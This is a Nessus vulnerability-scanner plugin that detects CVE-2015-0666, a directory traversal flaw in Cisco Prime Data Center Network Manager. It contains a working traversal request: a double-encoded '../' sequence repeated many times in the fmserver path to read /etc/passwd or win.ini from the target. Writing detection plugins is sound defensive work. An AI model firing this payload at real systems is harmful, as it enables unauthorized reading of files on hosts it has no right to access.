#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(82740);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/04/27 19:46:26 $");

  script_cve_id("CVE-2015-0666");
  script_bugtraq_id(73479);
  script_osvdb_id(120184);
  script_xref(name:"CISCO-BUG-ID", value:"CSCus00241");
  script_xref(name:"IAVB", value:"2015-B-0043");
  script_xref(name:"CISCO-SA", value:"cisco-sa-20150401-dcnm");

  script_name(english:"Cisco Prime Data Center Network Manager < 7.1(1) Directory Traversal Vulnerability");
  script_summary(english:"Attempts to read a file on the remote host.");

  script_set_attribute(attribute:"synopsis", value:
"A network management system on the remote host is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Cisco Prime Data Center Network Manager (DCNM) installed on the
remote host is affected by a directory traversal vulnerability in the fmserver
servlet due to improper validation of user-supplied information. An
unauthenticated, remote attacker, using a crafted file pathname, can read
arbitrary files from the filesystem outside of a restricted path.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-15-111/");
  # http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20150401-dcnm
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c4477eb6");
  script_set_attribute(attribute:"see_also", value:"https://tools.cisco.com/security/center/viewAlert.x?alertId=37810");
  script_set_attribute(attribute:"solution", value:"Upgrade to Cisco Prime Data Center Network Manager 7.1(1) or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/04/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/04/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/04/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cisco:prime_data_center_network_manager");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CISCO");

  script_copyright(english:"This script is Copyright (C) 2015-2017 Tenable Network Security, Inc.");

  script_dependencies("cisco_prime_dcnm_web_detect.nasl");
  script_require_keys("installed_sw/cisco_dcnm_web");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

appname = "Cisco Prime DCNM";
app_id  = "cisco_dcnm_web";
get_install_count(app_name:app_id, exit_if_zero:TRUE);

port = get_http_port(default:80);
install = get_single_install(app_name:app_id, port:port);

path = install['path'];
install_url = build_url(qs:path, port:port);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  url = path + "/fmserver/" + crap(length:15*10, data:"%252E%252E%252F") + file ;
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      file        : file,
      request     : make_list(build_url(qs:url, port:port)),
      output      : chomp(res[2]),
      attach_type : 'text/plain'
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
